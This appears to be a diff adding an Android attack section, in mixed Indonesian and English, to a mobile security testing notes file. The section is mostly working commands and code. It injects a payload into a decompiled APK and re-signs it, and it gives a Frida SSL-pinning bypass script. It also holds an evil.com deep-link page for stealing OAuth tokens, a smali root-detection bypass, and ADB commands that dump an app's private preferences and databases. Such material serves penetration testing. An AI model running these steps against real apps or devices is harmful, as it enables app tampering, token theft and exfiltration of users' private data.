@@ -118,3 +118,101 @@ Delivery: SMS phishing / in-app link / QR code
 - apktool — https://ibotpeaches.github.io/Apktool/
 - OWASP MASVS — https://mas.owasp.org/
 - Mobile Security Framework (MobSF) — https://github.com/MobSF/Mobile-Security-Framework-MobSF
+
+## Konkret — Android Exploit Payload (Testable)
+
+### APK Decompile + Inject
+
+```bash
+# 1. Decompile APK
+apktool d target.apk -o target_src
+# 2. Edit smali (injeksi payload)
+# Misal: SplashActivity.smali → tambah Runtime.exec()
+# 3. Recompile
+apktool b target_src -o target_mod.apk
+# 4. Sign (build-tools)
+apksigner sign --ks debug.keystore --ks-key-alias androiddebugkey target_mod.apk
+# Atau zipalign + jarsign (API <24)
+zipalign -v 4 target_mod.apk target_aligned.apk
+```
+
+### Frida Hooking (Runtime Instrumentation)
+
+```bash
+# 1. Frida server di device (root)
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server"
+adb shell "/data/local/tmp/frida-server &"
+
+# 2. Hook SSL pinning (bypass cert check)
+frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause
+
+# 3. Hook encryption (dump key/iv sebelum enkripsi)
+frida -U -f com.target.app -l dump_crypto.js
+
+# bypass script:
+Java.perform(function() {
+    var SSLContext = Java.use('javax.net.ssl.SSLContext');
+    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(a, b, c) {
+        console.log("[*] SSL pinning bypassed");
+        this.init(a, [Java.use('javax.net.ssl.X509TrustManager').$new()], c);
+    };
+});
+```
+
+### Deep Link Hijacking
+
+```xml
+<!-- AndroidManifest.xml: target app register deep link -->
+<intent-filter>
+    <action android:name="android.intent.action.VIEW" />
+    <category android:name="android.intent.category.DEFAULT" />
+    <category android:name="android.intent.category.BROWSABLE" />
+    <data android:scheme="myapp" android:host="callback" />
+</intent-filter>
+
+<!-- Attacker: bikin HTML page di evil.com -->
+<a href="myapp://callback?token=STOLEN_TOKEN">Click</a>
+<!-- Victim klik → target app terima token attacker → OAuth token theft -->
+```
+
+### Root Detection Bypass (Smali)
+
+```smali
+# target_src/smali/com/target/RootCheck.smali
+# Method: isDeviceRooted() → return false
+.method public static isDeviceRooted()Z
+    .locals 1
+    const/4 v0, 0x0    # return false (bypass)
+    return v0
+.end method
+```
+
+### ADB Exploit Commands
+
+```bash
+# Install APK tanpa konfirmasi ( jika ADB debug enabled )
+adb install -r payload.apk
+
+# Akses shell (root jika device rooted / debug build)
+adb shell
+# Access app private data
+adb shell run-as com.target.app
+# Dump SharedPreferences
+cat /data/data/com.target.app/shared_prefs/*.xml
+# Dump SQLite database
+cat /data/data/com.target.app/databases/*.db > /sdcard/dump.db
+```
+
+### Test Checklist Mobile
+
+1. APK decompile → cek exported activities, deep links
+2. Frida → hook SSL pinning, crypto, bypass root detection
+3. ADB → dump shared_prefs, databases
+4. Intent spoofing → kirim intent ke hidden activities
+5. WebView → cek JavaScript enabled, addJavascriptInterface
+6. Certificate pinning → bypass via Frida/objection
+---
+
+audited
+---
